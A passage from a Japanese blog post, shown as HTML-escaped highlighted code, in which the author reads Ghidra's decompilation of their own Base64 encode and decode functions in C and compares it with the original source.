        &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;local_8 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; local_2c&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;param_1 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; local_c&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x3f&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          local_8&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; local_2c&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;param_1 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; local_c&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;3U&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;
                                &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;param_1 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; local_c &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xfU&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          local_8&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; local_2c&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;param_1 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; local_c &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xfU&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;
                                &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;param_1 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; local_c &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;6&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;3U&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          local_8&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; local_2c&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;param_1 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; local_c &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x3f&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
        local_8 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; local_8 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        local_c &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; local_c &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;local_8 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token char&quot;&gt;&apos;\0&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; pcVar1&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;気になった点としては以下の点があります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;pcVar1 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;thunk_FUN_0041973b&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uint&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;param_2 &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pcVar1 &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
	pcVar1 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;この部分の元のソースコードは以下のようになってました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// エンコード後の文字列格納領域の確保&lt;/span&gt;
length &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;size &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;// mallocの戻り値は確保したメモリブロックを指すポインタ&lt;/span&gt;
base64 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;length&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;base64 &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token constant&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token constant&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;まず、&lt;code class=&quot;language-text&quot;&gt;thunk_FUN_0041973b&lt;/code&gt;をGhidraで追ってみると次のようになっていました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;FUN_0041973b&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;size_t&lt;/span&gt; param_1&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;__malloc_base&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;param_1&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;この結果から、&lt;code class=&quot;language-text&quot;&gt;thunk_FUN_0041973b&lt;/code&gt;は&lt;code class=&quot;language-text&quot;&gt;malloc&lt;/code&gt;関数であることがわかりました。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://strontic.github.io/xcyclopedia/library/ucrtbase.dll-34A153A39639A1DB64761AEDACDFA4AE.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;ucrtbase.dll | Microsoft C Runtime Library | STRONTIC&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;つまり、&lt;code class=&quot;language-text&quot;&gt;malloc&lt;/code&gt;関数の引数として与えられている&lt;code class=&quot;language-text&quot;&gt;(uint)(param_2 &amp;lt;&amp;lt; 2) / 3 + 3&lt;/code&gt;が、ソースコードでいうところの以下の行であることがわかります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// エンコード後の文字列格納領域の確保&lt;/span&gt;
length &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;size &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;興味深い点としては、一度変数&lt;code class=&quot;language-text&quot;&gt;length&lt;/code&gt;に入れていたはずの値がデコンパイル結果では直接&lt;code class=&quot;language-text&quot;&gt;malloc&lt;/code&gt;関数に受け渡されている点と、&lt;code class=&quot;language-text&quot;&gt;size * 4&lt;/code&gt;の演算がデコンパイル結果ではシフト演算に置き換わっている点です。&lt;/p&gt;
&lt;p&gt;リバースエンジニアリングを行う場合は、このあたりのコンパイラの気持ちも理解しつつ進めていく必要がありそうですね。&lt;/p&gt;
&lt;h3 id=&quot;base64decode関数のデコンパイル結果を読む&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#base64decode%E9%96%A2%E6%95%B0%E3%81%AE%E3%83%87%E3%82%B3%E3%83%B3%E3%83%91%E3%82%A4%E3%83%AB%E7%B5%90%E6%9E%9C%E3%82%92%E8%AA%AD%E3%82%80&quot; aria-label=&quot;base64decode関数のデコンパイル結果を読む permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Base64Decode関数のデコンパイル結果を読む&lt;/h3&gt;
&lt;p&gt;続いてDecodeの関数のデコンパイル結果も見ていきます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; __cdecl &lt;span class=&quot;token function&quot;&gt;base64_decode&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;param_1&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;param_2&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; param_3&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  byte bVar1&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token class-name&quot;&gt;size_t&lt;/span&gt; sVar2&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  byte &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;pbVar3&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  byte &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;in_EDX&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  undefined8 uVar4&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;in_stack_ffffff50&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; local_ac&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  uint local_98&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  byte &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;local_94&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  uint local_90&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  byte local_88 &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  uint local_8&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  
  local_8 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; DAT_00474224 &lt;span class=&quot;token operator&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uint&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;stack0xfffffffc&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  local_94 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; in_EDX&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;param_1 &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    in_stack_ffffff50 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    local_ac &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token char&quot;&gt;&apos;=&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;local_90 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;local_90 &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; local_90 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; local_90 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;DAT_00467f24&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;local_90 &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; param_3&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        in_stack_ffffff50 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;PTR_s_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef_00467f28&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;local_90 &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        local_ac &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;DAT_00467f2c&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;local_90 &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
